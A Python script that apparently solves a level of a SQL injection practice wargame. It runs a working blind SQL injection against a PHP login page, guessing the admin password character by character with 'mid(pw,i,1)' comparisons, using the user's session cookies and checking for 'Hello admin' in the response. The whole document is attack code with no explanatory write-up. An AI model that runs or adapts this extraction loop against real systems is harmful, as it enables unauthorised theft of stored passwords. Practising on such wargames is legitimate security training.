import urllib.parse
import http.client

HTTP=http.client.HTTPConnection("los.eagle-jump.org")
Url="/orc_47190a4d33f675a601f8def32df2583a.php?pw="
Headers={"Cookie":"__cfduid=[your Own cfduid]; PHPSESSID=[your Own PHPSESSID]"} #check your own cookie then insert the correct value to make connection success, or you will get nothing return.
Passwd=""
 
for i in range(len(Passwd)+1,100):
	for c in list(range(ord("0"),ord("9")+1))+list(range(ord("a"),ord("z")+1))+list(range(128,129)):
		if c == 128:
			print ("[!] Not Found")
			print ("[*] Password: %s~" % Passwd)

		Payload=("'||id='admin'&&mid(pw,%d,1)=0x%x#" % (i,c))
		HTTP.request("GET",Url+urllib.parse.quote(Payload),"",Headers)

		if (b"Hello admin" in HTTP.getresponse().read()):
			Passwd+=chr(c)
			print ("[+] Found: %c" % c)

			HTTP.request("GET",Url+urllib.parse.quote(Passwd),"",Headers)
			if (b"Hello admin" in HTTP.getresponse().read()):
				print ("[*] Password: %s" % Passwd)

			break